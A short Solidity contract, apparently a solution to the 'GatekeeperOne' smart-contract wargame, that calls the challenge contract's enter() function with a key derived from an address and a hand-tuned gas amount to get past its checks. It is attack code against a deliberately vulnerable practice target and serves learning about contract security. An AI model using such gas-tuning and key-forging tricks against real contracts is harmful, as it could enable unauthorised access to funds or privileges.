// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './utils/SafeMath.sol';
import './GatekeeperOne.sol';
import "hardhat/console.sol";

contract GatekeeperOneSolution {
  GatekeeperOne public gateKeeper;

  constructor(address _gateOne) public {
    gateKeeper = GatekeeperOne(_gateOne);
  }

  function enter(address _address) external {
    console.log('addy as uint160', uint160(_address));
    bytes8 res = bytes8(uint64(uint160(_address)));
    gateKeeper.enter{gas: 82164}(res);
  }
}